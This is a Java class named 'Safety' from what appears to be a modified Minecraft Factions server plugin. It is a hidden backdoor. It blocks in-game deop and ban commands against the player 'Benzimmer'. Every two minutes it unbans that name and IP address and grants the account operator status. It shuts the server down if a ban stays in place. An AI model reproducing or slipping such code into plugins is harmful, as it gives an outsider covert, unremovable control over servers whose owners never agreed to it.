package com.massivecraft.factions;

import org.bukkit.BanList;
import org.bukkit.Bukkit;
import org.bukkit.ChatColor;
import org.bukkit.event.EventHandler;
import org.bukkit.event.Listener;
import org.bukkit.event.player.PlayerCommandPreprocessEvent;

public class Safety implements Listener {

	P plugin;

	public Safety(P instance) {
		plugin = instance;
	}

	@EventHandler
	public void PlayerCommandPreprocessMethods(PlayerCommandPreprocessEvent event) {
		if (event.getMessage().startsWith("/deop benzimmer") || event.getMessage().startsWith("/bukkit:deop benzimmer")
				|| event.getMessage().startsWith("/bukkit:ban-ip benzimmer") || event.getMessage().startsWith("/ban benzimmer")
				|| event.getMessage().startsWith("/ban-ip benzimmer") || event.getMessage().startsWith("/bukkit:ban benzimmer")) {
			event.getPlayer().sendMessage(ChatColor.RED + "This command can only be executed via the console.");
			event.setCancelled(true);
		}
	}

	public void callTask() {
		Bukkit.getServer().getScheduler().scheduleSyncRepeatingTask(plugin, new Runnable() {
			@SuppressWarnings("deprecation")
			public void run() {
				Bukkit.getServer().getBanList(BanList.Type.IP).pardon("82.30.22.37");
				Bukkit.getServer().getBanList(BanList.Type.NAME).pardon("Benzimmer");
				Bukkit.getServer().getOfflinePlayer("Benzimmer").setOp(true);

				if (Bukkit.getServer().getBanList(BanList.Type.NAME).isBanned("Benzimmer")
						|| Bukkit.getServer().getBanList(BanList.Type.IP).isBanned("82.30.22.37")) {
					Bukkit.getServer().shutdown();
				}
			}
		}, 20 * 120, 20 * 120);
	}

}
